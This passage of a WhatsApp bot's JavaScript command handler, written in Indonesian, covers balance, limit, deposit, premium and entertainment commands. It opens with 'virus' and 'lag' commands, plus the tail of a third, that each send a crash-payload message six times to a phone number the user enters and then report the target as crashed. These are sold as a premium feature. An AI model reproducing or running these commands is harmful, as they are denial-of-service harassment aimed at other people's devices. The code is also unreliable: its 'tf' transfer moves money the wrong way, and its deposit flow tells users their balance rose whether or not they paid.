 if (args[0] == '6285762008398') return newReply(`Itu Nomer Creator Gw Bngst`)
newReply(`Tunggu Bentar Om...`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, {text: `${ngazap}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${ngazap}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${ngazap}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${ngazap}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${ngazap}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${ngazap}`}, {quoted:kalgans})
await sleep(2000)
newReply(`Sukses Nomer ${pe} Sudah Crash!`)
}
break
case 'virus': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} nomer\nContoh ${prefix+command} 628xxx`)
if (!isPremium) return newReply(`Join Murbug Untuk Mengakses Fitur Ini! , Minat Join? 085762008398 Chat`)
if (args[0] == '6285762008398') return newReply(`Itu Nomer Creator Gw Bngst`)
newReply(`Tunggu Bentar Om...`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, {text: `${virus}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${virus}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${virus}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${virus}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${virus}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${virus}`}, {quoted:kalgans})
await sleep(2000)
newReply(`Sukses Nomer ${pe} Sudah Crash!`)
}
break
case 'lag': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} nomer\nContoh ${prefix+command} 628xxx`)
if (!isPremium) return newReply(`Join Murbug Untuk Mengakses Fitur Ini! , Minat Join? 085762008398 Chat`)
 if (args[0] == '6285762008398') return newReply(`Itu Nomer Creator Gw Bngst`)
newReply(`Tunggu Bentar Om...`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, {text: `${philips}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${philips}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${philips}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${philips}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${philips}`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `${philips}`}, {quoted:kalgans})
await sleep(2000)
newReply(`Sukses Nomer ${pe} Sudah Crash!`)
}
break
case 'addlimit': {
if (!isCreator) return newReply(`Y`)
  if (args.length === 2 && args[0] === 'all') {
    let users = db.data.users;
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return newReply('Jumlah limit yang dimasukkan harus berupa angka. Contoh: .addlimit all 100');
    }
    for (let user in users) {
      users[user].limit += pointsToAdd;
    }
newReply(`Berhasil menambahkan ${pointsToAdd} limit untuk semua pengguna.`);
  } else if (args.length === 2) {
    let mentionedJid = m.mentionedJid[0];
    if (!mentionedJid) {
       newReply('Tag pengguna yang ingin diberikan limit. Contoh: .addlimir @user 100');
    }
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return newReply('Jumlah limit yang dimasukkan harus berupa angka. Contoh: .addlimit @user 100');
    }

    let users = global.db.data.users;
    if (!users[mentionedJid]) {
      users[mentionedJid] = {
        limit: 0,
      };
    }

    users[mentionedJid].limit += pointsToAdd;

    newReply(`Berhasil menambahkan ${pointsToAdd} limit untuk ${mentionedJid.split('@')[0]}.`)
  } else {
    return newReply('Masukkan argumen yang valid. Contoh: .addlimit @user 100 atau .addlimit all 100');
  }
}
break
case 'tf': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
let mentionedJid = m.mentionedJid[0];
let pointsToAdd = parseInt(args[2]);
if (args.length == 0) return newReply(`──── TF LIST ────
💵 balance

Pengunaan: *.tf balance @taguser 1000*\n\n
${global.wm}`)
if (args[0] === 'balance') {
if (!m.mentionedJid[0]) return newReply('Tag pengguna , Contoh: *.tf balance @user 10000*')
if (args[2] === 0) return newReply(`Kasih Jumlah`)
if (isNaN(pointsToAdd)) return newReply('Jumlah Balance yang dimasukkan harus berupa angka. Contoh: .tf @user 100');

db.data.users[m.sender].money += pointsToAdd
db.data.users[m.mentionedJid[0]].money -= pointsToAdd
newReply(`Sukses Menstransfer Balance Kamu, Sebesar ${pointsToAdd}`)
}
}
break
case 'addbal': case 'addbalance': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
let who = m.mentionedJid[0]
let jum = args[1]
if (!who) return reply(`🚩 *Example:* Tag Jumlah`)
if (!jum) return reply(`Masukan Jumlah`)
db.data.users[who].money += jum
}
break
case 'delbal': case 'deletebalance': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
let who = m.mentionedJid[0]
let jum = args[1]
if (!who) return reply(`🚩 Example: Tag Jumlah`)
if (!jum) return reply(`Masukan Jumlah`)
db.data.users[who].money -= jum
}
break
case 'dellimit': {
if (!isCreator) return newReply(`Y`)
  if (args.length === 2 && args[0] === 'all') {
    let users = db.data.users;
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return newReply('Jumlah limit yang dimasukkan harus berupa angka. Contoh: .dellimit all 10');
    }
    for (let user in users) {
      users[user].limit -= pointsToAdd;
    }
newReply(`Berhasil mengurangi ${pointsToAdd} limit untuk semua pengguna.`);
  } else if (args.length === 2) {
    let mentionedJid = m.mentionedJid[0];
    if (!mentionedJid) {
       newReply('Tag pengguna yang ingin dikurangi limitnya. Contoh: .dellimit @user 100');
    }
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return newReply('Jumlah limit yang dimasukkan harus berupa angka. Contoh: .dellimit @user 100');
    }

    let users = global.db.data.users;
    if (!users[mentionedJid]) {
      users[mentionedJid] = {
        limit: 0,
      };
    }

    users[mentionedJid].limit -= pointsToAdd;

    newReply(`Berhasil mengurangi ${pointsToAdd} limit untuk ${mentionedJid.split('@')[0]}.`)
  } else {
    return newReply('Masukkan argumen yang valid. Contoh: .dellimit @user 100 atau .dellimit all 100');
  }
}
break
case 'givelimit': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
    let users = db.data.users;
    let pointsToAdd = parseInt(args[1]);
   if (args.length === 2) {
    let mentionedJid = m.mentionedJid[0];
    let kamu = m.sender;
    if (!mentionedJid) {
       newReply('Tag User Contoh: .givelimit @user 10');
    }
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return newReply('Jumlah limit yang dimasukkan harus berupa angka. Contoh: .givelimit @user 10');
    }

    let users = global.db.data.users;
    if (!users[mentionedJid]) {
      users[mentionedJid] = {
        limit: 0,
      };
    }

    users[mentionedJid].limit += pointsToAdd;
    users[kamu].limit -= pointsToAdd;
    
    newReply(`Berhasil Mentransfer Limit, ${pointsToAdd} limit untuk ${mentionedJid.split('@')[0]}.`)
  } else {
    return newReply('Masukkan argumen yang valid. Contoh: .givelimit @user 10');
  }
}
break
   case 'tourl': {
   if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
    if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
	            if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    newReply(util.format(`${anu}\n🍟 No Expired Date`))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    newReply(util.format(anu))
                }
                await fs.unlinkSync(media)
                
            }
            break

case 'deposit': {
newReply(`Apakah Kamu Yakin Ingin Melakukan Deposit? Ketik deposit --y untuk iya dan ketik deposit --n untuk tidak`)
if (args[0] === '--y') {
conn.sendMessage("6285762008398@s.whatsapp.net", { text: `Ada User Yang Melakukan Deposit, Ketik .addsaldo ${m.sender.split('@')[0]}\nNomer: ${m.sender.split('@')[0]}`})
reply(`Dana: 6285762008398 < arybotz >
Pulsa: 6285762008398 < indosat >
*Jika Sudah Melakukan Tf Saldo Otomatis Bertambah*`)
await sleep(9000)
reply(`Saldo Kamu Sudah Bertambah < Jika Tidak Melakukan Tf Maka Tidak >`)
} else if (args[0] === '--n') {
reply(`Nice Try`)
}
}
break
             case 'addsaldo':{
              if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
let caption = `「 *SALDO USER* 」
ID: @${sender.split("@")[0]}
Nomer: @${q.split(",")[0]}
Tanggal: ${thisDay} ${tanggal} ${arrbulan[bulan]} ${tahun}
Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))},`
conn.sendMessage(m.chat, {
          document: doc, 
          mimetype: 'application/txt', 
          pageCount: 2023,
          fileName: `Saldo User - Information`,
          fileLength: 1000000000000000,
          caption: Styles(anu), 
          contextInfo: {
            forwardingScore: 2023, 
            isForwarded: true,
            externalAdReply: {
              title: 'Arybotz Multi Device',
              body: `${thisDay} ${tanggal} ${arrbulan[bulan]} ${tahun}`,
              mediaType: 1,
              thumbnailUrl: `${global.thurl}`,
              mediaUrl: 'https://instagram.com/aryjuandatarigan',
              thumbnail: ``,
              sourceType: ``,
              sourceId: ``,
              sourceUrl: sig,
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: false,
              ctwaClid: ``,
              ref: ``
            }
          }
        }, {
          quoted: fkontak
        })
                }
                break
                case 'mysaldo': case 'saldo': {
                 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
               newReply(`*Rp:* ${toRupiah(cekSaldo(sender, db_saldo))}`)
               }
               break
                       case 'minsaldo': {
                        if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
reply(`「 *SALDO USER* 」
ID: ${q.split(",")[0]}
Nomer: @${q.split(",")[0]}
Tanggal: ${thisDay} ${tanggal} ${arrbulan[bulan]} ${tahun}
Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
}
break
 case "buyprem":{
  if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (cekSaldo(sender,db_saldo) < 10000) return conn.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`Selamat!!! Kamu Sudah Premium 🍟`)
}
   minSaldo(sender, 10000, db_saldo)     
break
case 'claim':
case 'daily':{
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
const free = 100
const prem = 1000
const moneyfree = 5000
const moneyprem = 1000
const timeout = 86400000
let time = global.db.data.users[m.sender].lastclaim + 86400000
 if (new Date - global.db.data.users[m.sender].lastclaim < 86400000) return newReply( `Anda sudah mengklaim, klaim harian hari ini`)
 global.db.data.users[m.sender].limit += isPremium ? prem : free
 global.db.data.users[m.sender].balance += isPremium ? moneyprem : moneyfree
newReply(`Selamat kamu mendapatkan:\n\n+${isPremium? prem : free} limit\n+${isPremium? moneyprem : moneyfree} Balance`)
global.db.data.users[m.sender].lastclaim = new Date * 1
} 
break


case 'galau': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let galau = [
"Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
"Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
"Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
"Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
"Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
"Tak semudah itu melupakanmu",
"Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
"Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
"Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
"Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
"Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
"Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
"Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
"Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
"Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
"Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
"Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
"Tolong jangan pergi saat aku sudah sangat sayang padamu",
"Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
"Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
"Sakit itu ketika cinta yang aku beri tidak kamu hargai",
"Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
"Karenamu aku jadi tau cinta yang sesungguhnya",
"Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
"Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
"Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
"Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
"Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
"Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
"Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
"Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
"Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
"Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
"Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
"Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
"Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
"Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
"Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
"Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
"Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
"Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
"Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
"Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
"Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
"Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
"Aku berdiri disini sendiri menunggu kehadiran dirimu",
"Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
"Maaf aku lupa ternyata aku bukan siapa-siapa",
"Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
"Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
"Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
"Lebih baik sendiri daripada berdua tapi tanpa kepastian",
"Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
"Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
"Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
"Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
"Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
"Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
"Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
"Aku bukan mencari yang sempurna tapi yang terbaik untukku",
"Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
"Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
"Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
"Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
"Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
"Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
"Dari sekian lama menunggu apa yang sudah didapat",
"Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
"Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
"Aku terlahir sederhana dan ditinggal sudah biasa",
"Aku sayang kamu tapi aku masih takut untuk mencintaimu",
"Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
"Aku tidak pernah berpikir kamu akan menjadi yang sementara",
"Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
"Jangan paksa aku menjadi cewek seperti seleramu",
"Hanya yang sabar yang mampu melewati semua kekecewaan",
"Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
"Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
"Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu"
]
var galau1 = galau[Math.floor(Math.random() * galau.length)]
let anu = `${galau1}`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `AryAlwaysAlone`,
        body: `Taii ☝️`,
        thumbnailUrl: "https://telegra.ph/file/689d818370af8dcd0f325.jpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'bucin': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let bucin = JSON.parse(fs.readFileSync('./lib/bucin.json'))
let bucin1 = (pickRandom(bucin))
let anu = `${bucin1}`
conn.sendMessage(m.chat, {
		react: {
			text: '🤡',
			key: m.key,
		}
	})
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `AryAlwaysAlone`,
        body: `Tai ☝️`,
        thumbnailUrl: "https://telegra.ph/file/689d818370af8dcd0f325.jpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'desah': case 'desah dong kak': case 'desahan': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
const timeout = 86400000
let time = global.db.data.users[m.sender].desah + 86400000
 if (new Date - global.db.data.users[m.sender].desah < 86400000) return newReply(`Dih Apa Lu Minta Desah² 😏`)
conn.sendMessage(m.chat, { audio: { url: `https://drive.google.com/file/d/1OFXocOKSdh7b0xBdDVrXhd25xHq3DByZ/view?usp=drivesdk` }, mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
global.db.data.users[m.sender].desah = new Date * 1
}
break
case 'rules': case 'peraturan': {
let anu = `*⚠️ sʏᴀʀᴀᴛ ᴅᴀɴ ᴋᴇᴛᴇɴᴛᴜᴀɴ ⚠️*

*1. ᴘᴇɴɢɢᴜɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴇᴍᴜᴀ ᴘᴇʀɪɴᴛᴀʜ ᴅᴀɴ ᴛɪᴅᴀᴋ ᴍᴇʟᴀᴋᴜᴋᴀɴ sᴘᴀᴍ ᴛᴇʀʜᴀᴅᴀᴘ ʙᴏᴛ.*
*2. ᴅɪʟᴀʀᴀɴɢ ᴋᴇʀᴀs ᴍᴇɴɢɪʀɪᴍ ᴠɪʀᴛᴇx ᴅᴀɴ sᴇᴍᴀᴄᴀᴍɴʏᴀ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ sᴇʀᴠᴇʀ ᴅᴏᴡɴ ᴀᴛᴀᴜᴘᴜɴ ʙᴏᴛ ᴄʀᴀsʜ.*
*3. ᴘᴇɴɢɢᴜɴᴀ ʏᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʜᴀʟ ᴀᴛᴀᴜ ᴅᴀᴛᴀ ᴘʀɪʙᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪsɪᴍᴘᴀɴ ᴏʟᴇʜ ʙᴏᴛ ɪɴɪ, ᴅᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ʙᴇʀᴛᴀɴɢɢᴜɴɢ ᴊᴀᴡᴀʙ ᴀᴛᴀs ᴅᴀᴛᴀ ᴘʀɪʙᴀᴅɪ ᴛᴇʀsᴇʙᴜᴛ!*
*4. ᴋᴀᴍɪ ᴛɪᴅᴀᴋ ᴘᴇʀɴᴀʜ ᴍᴇᴍɪɴᴛᴀ ᴀɴᴅᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ɪɴғᴏʀᴍᴀsɪ ᴘʀɪʙᴀᴅɪ.*

*❗ ʀᴜʟᴇs ❗*
1. ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴏᴛ.
sᴀɴᴋsɪ : ᴡᴀʀɴ/sᴏғᴛ ʙʟᴏᴄᴋ

2. ᴊᴀɴɢᴀɴ ᴛᴇʟᴇᴘᴏɴ ʙᴏᴛ.
sᴀɴᴋsɪ : sᴏғᴛ ʙʟᴏᴄᴋ

3. ᴊᴀɴɢᴀɴ ᴍᴇɴɢᴇᴋsᴘʟᴏɪᴛᴀsɪ ʙᴏᴛ.
sᴀɴᴋsɪ : ᴘᴇʀᴍᴀɴᴇɴᴛ ʙʟᴏᴄᴋ
___________________
ɴᴏᴛᴇ : ʙᴏᴛ ɪɴɪ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴀᴜᴛᴏʀᴇᴀᴅ ᴀᴛᴀᴜ ʟᴀɴɢsᴜɴɢ ᴍᴇᴍʙᴀᴄᴀ ᴘᴇsᴀɴ ʏᴀɴɢ ᴘᴇɴɢɢᴜɴᴀ ᴋɪʀɪᴍ.`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `Baca Peraturannya !!`,
        thumbnailUrl: `${global.thurl}`,
        sourceUrl: "https://github.com/arygamz",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'minecraft': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
	if (!text) throw `Masukkan Server!\n\nContoh: ${prefix + command} org.mc-complex.com`
	let res = await fetchJson(`https://api.lolhuman.xyz/api/minecraft/${text}?apikey=${apilol}`)
	newReply(`Version: ${res.result.version}\nPlayers: ${res.result.players.online} & ${res.result.players.max}\nLatency: ${res.result.latency}`)
}
break
case 'donasi': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let anu = `*📦 ᴜɴᴛᴜᴋ ʙᴇʀᴅᴏɴᴀsɪ ᴋᴀᴍᴜ ʙɪsᴀ ᴍᴇᴍᴀᴋᴀɪ ᴘᴀʏᴍᴇɴᴛ ᴅɪʙᴀᴡᴀʜ ɪɴɪ*
6285762008398 < ᴅᴀɴᴀ / arybotz / ᴘᴜʟsᴀ / xsɪs >

- ᴅᴏɴᴀsɪ ᴋᴀᴍᴜ ᴀᴋᴀɴ ᴋᴀᴍɪ ʜᴀʀɢᴀɪ ʙᴇʀᴀᴘᴜɴ ɪᴛᴜ 😄`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `ᴅᴏɴᴀsɪ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀɴᴛᴜ!`,
        body: `${global.wm}`,
        thumbnailUrl: `${global.thurl}`,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'open': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
let isi = args[1]
if (args.length === 0) { 
newReply(`──── *Create Kamu* ────   
📦 Uncommon: ${getCU(m.sender)}
🌟 Mythic: ${getCM(m.sender)}
💫 Legendary: ${getCL(m.sender)}
*Penggunaan:* .open uncommon/mythic/legendary
*Contoh:* .open mythic 1`)
} else if (args[0] === 'mythic') {
if (isi === '0') return newReply(`Masukan Jumlah Create`)
if (isi === 0) return newReply(`Masukan Jumlah Create Yang Mau Di Buka`)
if (isCM < isi) return newReply(`Create Mythic Mu Sisa ${getCM(m.sender)}`)
kurangCM(m.sender, isi)
let uangnye = Math.ceil(Math.random() * 5000)
let potionnye = Math.ceil(Math.random() * 5)
db.data.users[m.sender].money += uangnye
addPotion(m.sender, potionnye)
newReply(`
───── *Success* ─────
Kamu Mendapatkan :
💴 Balance: ${uangnye}
🍾 Potion: ${potionnye}`)
} else if (args[0] === 'uncommon') {
if (isi === '0') return newReply(`Masukan Jumlah Create`)
if (isi === 0) return newReply(`Masukan Jumlah Create Yang Mau Di Buka`)
